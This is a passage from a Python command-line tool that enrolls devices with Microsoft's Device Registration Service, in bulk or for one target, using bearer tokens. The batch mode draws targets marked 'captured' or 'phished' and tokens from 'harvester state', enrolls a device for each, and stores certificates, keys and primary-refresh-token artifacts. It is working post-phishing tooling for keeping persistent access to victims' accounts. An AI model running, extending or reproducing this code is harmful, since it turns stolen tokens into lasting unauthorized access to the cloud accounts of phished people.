            inner["Data"] = data[:64] + "...[truncated]"
            preview[ENVELOPE_KEYS["certificate_request"]] = inner
        tk = preview.get(ENVELOPE_KEYS["transport_key"], "")
        preview[ENVELOPE_KEYS["transport_key"]] = tk[:32] + "...[truncated]"
        print(json.dumps(preview, indent=2))
        return 0

    status, _headers, body = post_enrollment(
        args.endpoint, args.token, envelope, args.timeout
    )

    if 200 <= status < 300:
        try:
            parsed = json.loads(body.decode("utf-8"))
        except json.JSONDecodeError:
            print(f"[+] HTTP {status} but body is not JSON:", file=sys.stderr)
            print(body.decode("utf-8", errors="replace")[:1000])
            return 1

        cert = extract_certificate(parsed)
        device_id = extract_device_id(parsed)

        if cert and args.cert_out:
            Path(args.cert_out).write_text(
                cert if cert.endswith("\n") else cert + "\n"
            )
            print(f"[+] certificate written to {args.cert_out}", file=sys.stderr)
        if device_id:
            print(f"[+] device object ID: {device_id}", file=sys.stderr)

        if not cert:
            print("[!] 2xx but no recognizable certificate field. Raw body:",
                  file=sys.stderr)
            print(json.dumps(parsed, indent=2))
            return 1

        return 0

    kind, message = classify_failure(status, body)
    print(f"[!] {kind}: {message}", file=sys.stderr)
    return 1


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="DRS enrollment client and batch driver.")

    p.add_argument("--cn", default=None,
                   help="Common Name. Presence selects manual single-target mode.")

    p.add_argument("--cn-prefix", default="drs",
                   help="Prefix for auto-generated CNs in batch mode.")
    p.add_argument("--org", default=None)
    p.add_argument("--display-name", default=None)
    p.add_argument("--os-type", default="Windows",
                   help="DeviceType sent to DRS (e.g. Windows).")
    p.add_argument("--os-version", default="10.0.19045")
    p.add_argument("--device-type", default="Workstation",
                   help="Kept for backward compatibility; not sent to DRS.")
    p.add_argument("--manufacturer", default=None,
                   help="Kept for backward compatibility; not sent to DRS.")
    p.add_argument("--model", default=None,
                   help="Kept for backward compatibility; not sent to DRS.")
    p.add_argument("--target-domain", default=None,
                   help="TargetDomain. Derived from the UPN if not given.")
    p.add_argument("--tenant-hint", default=None,
                   help="Deprecated; not part of the [MS-DVRJ] body.")
    p.add_argument("--user-hint", default=None,
                   help="Deprecated; not part of the [MS-DVRJ] body.")

    p.add_argument("--attr", action="append", default=[],
                   help="OID=VALUE, repeatable. DRS-specific; not guessed.")
    p.add_argument("--key-type", choices=["rsa", "ec"], default="rsa",
                   help="DRS requires RSA; EC is rejected at runtime.")
    p.add_argument("--rsa-bits", type=int, default=2048)
    p.add_argument("--ec-curve", default="secp256r1")
    p.add_argument("--csr-encoding", choices=["der-b64", "pem", "pem-b64"],
                   default="der-b64")

    p.add_argument("--endpoint", default=DEFAULT_ENDPOINT)
    p.add_argument("--timeout", type=float, default=30.0)

    p.add_argument("--token", default=None,
                   help="Bearer token (manual mode).")
    p.add_argument("--token-file", default=None,
                   help="Read token from file (manual mode).")

    p.add_argument(
        "--out-dir",
        default=os.environ.get("DRS_OUT_PATH"),
        help="Directory for per-target key and cert files "
             "(batch mode requires; also used in manual mode unless --key-out is set). "
             "Defaults to $DRS_OUT_PATH if set, otherwise None.",
    )
    p.add_argument("--enrollment-dir", default=None,
                   help="Write cert/key/prt artifacts into this directory. "
                        "If omitted, a new UUID directory is created under --out-dir.")
    p.add_argument("--key-out", default=None,
                   help="Explicit key output path (manual mode only).")
    p.add_argument("--csr-out", default=None,
                   help="Write the PEM CSR locally for inspection (manual mode only).")
    p.add_argument("--cert-out", default=None,
                   help="Explicit cert output path (manual mode only).")

    p.add_argument("--confirm", action="store_true",
                   help="Required to POST to DRS in batch mode. Without it, dry-run.")
    p.add_argument("--dry-run", action="store_true",
                   help="Print the envelope for each target and exit.")
    p.add_argument("--single-email", default=None,
                   help="Enroll exactly one target by email address. "
                        "Mutually exclusive with --from-state and --status.")
    p.add_argument("--status", default=None,
                   help="Only consider targets with this status (e.g. captured).")
    p.add_argument("--include-enrolled", action="store_true",
                   help="Re-enroll targets that already have a marker.")
    p.add_argument("--force-reenroll", action="store_true",
                   help="Re-enroll even if drs_enrolled_at is already set.")
    p.add_argument("--from-state", action="store_true",
                   help="Read the single token from harvester state instead of querying targets/tokens.")
    p.add_argument("--mark", action="store_true",
                   help="Write drs_enrolled_at after successful DRS enrollment "
                        "(stage 3). PRT completion is tracked separately via "
                        "prt_acquired_at.")
    p.add_argument("--limit", type=int, default=0,
                   help="Stop after this many targets (0 = no limit).")

    args = p.parse_args(argv)

    if args.force_reenroll:
        args.include_enrolled = True
        args.mark = True

    manual_mode = bool(args.cn)
    args.manual_mode = manual_mode

    if manual_mode:
        missing = [
            name for name, present in [
                ("--display-name", args.display_name),
                ("--key-out", args.key_out),
            ] if not present
        ]
        if not (args.token or args.token_file):
            missing.append("--token/--token-file")
        if missing:
            print(f"[!] manual mode requires: {', '.join(missing)}", file=sys.stderr)
            return 2
        if args.key_type != "rsa":
            print("[!] DRS requires RSA keys; EC is not accepted", file=sys.stderr)
            return 2
        if args.token_file:
            args.token = Path(args.token_file).read_text().strip()
        return run_manual(args)

    # Batch mode.
    if args.dry_run and args.confirm:
        print("[!] --dry-run and --confirm are mutually exclusive", file=sys.stderr)
        return 2
    if not args.confirm and not args.dry_run:
        args.dry_run = True
    if args.confirm and not args.out_dir:
        print("[!] --out-dir is required with --confirm", file=sys.stderr)
        return 2
    if args.key_out or args.cert_out or args.csr_out or args.token or args.token_file:
        print("[!] --key-out/--cert-out/--csr-out/--token are manual-mode only; "
              "remove them or pass --cn to select manual mode.", file=sys.stderr)
        return 2
    if args.key_type != "rsa":
        print("[!] DRS requires RSA keys; EC is not accepted", file=sys.stderr)
        return 2
    if args.status and args.status not in ('captured', 'captured_brittle', 'phished'):
        print(f"[!] --status must be one of captured, captured_brittle, phished "
              f"(got {args.status!r})", file=sys.stderr)
        return 2
    if args.single_email and args.from_state:
        print("[!] --single-email and --from-state are mutually exclusive",
              file=sys.stderr)
        return 2
    if args.single_email and args.status:
        print("[!] --single-email and --status are mutually exclusive",
              file=sys.stderr)
        return 2

    marker_ok = False
    if args.mark and not args.from_state:
        marker_ok = ensure_marker_column()
        if not marker_ok:
            if args.force_reenroll:
                print(
                    "[!] --force-reenroll requires the drs_enrolled_at "
                    "column; aborting rather than reporting success "
                    "without a marker.",
                    file=sys.stderr,
                )
                return 2
            print("[!] marker column could not be ensured; --mark disabled", file=sys.stderr)
    if not marker_ok and not args.include_enrolled and args.mark:
        args.include_enrolled = True

    try:
        if args.single_email:
            targets = load_single_target(args.single_email)
            if not targets:
                print(f"[!] no target with email {args.single_email}", file=sys.stderr)
                return 1
        elif args.from_state:
            targets = load_targets_from_state()
        else:
            targets = load_targets(
                include_enrolled=args.include_enrolled or not marker_ok,
                status=args.status,
            )
    except Exception as e:
        print(f"[!] failed to load targets: {e}", file=sys.stderr)
        return 1

    if not targets:
        print("no targets to consider")
        return 0

    print(f"considering {len(targets)} target(s)")

    attempted = 0
    enrolled = 0
    skipped_scope = 0
    skipped_no_token = 0

    for target in targets:
        if args.limit and attempted >= args.limit:
            break
        attempted += 1

        email = target["email"]
        token, reason = acquire_access_token(target)

        if not token:
            skipped_no_token += 1
            print(f"[skip] {email}: {reason}")
            continue

        if not token_has_drs_scope(token):
            skipped_scope += 1
            print(f"[skip] {email}: token does not carry scp=adrs_access")
            continue

        print(f"[try ] {email}")
        result = enroll_one(token, target, args)

        if result.get("success"):
            enrolled += 1
            if args.dry_run:
                print(f"[ok  ] {email}: dry-run")
                print(json.dumps(result["envelope"], indent=2))
            else:
                print(f"[ok  ] {email}: HTTP {result.get('http_status')} "
                      f"device_id={result.get('device_id')} "
                      f"enrollment_dir={result.get('enrollment_dir')}")
                if args.mark and marker_ok:
                    mark_enrolled(email)
        else:
            kind = result.get("failure_kind") or "error"
            msg = result.get("failure_message") or result.get("error") or "unknown"
            attempt_path = result.get("attempt_out")
            attempt_note = f" (details: {attempt_path})" if attempt_path else ""
            print(f"[fail] {email}: {kind}: {msg}{attempt_note}")

    print()
    print(f"attempted={attempted} enrolled={enrolled} "
          f"skipped_no_token={skipped_no_token} skipped_scope={skipped_scope}")
    return 0 if enrolled or args.dry_run else 1


if __name__ == "__main__":
    sys.exit(main())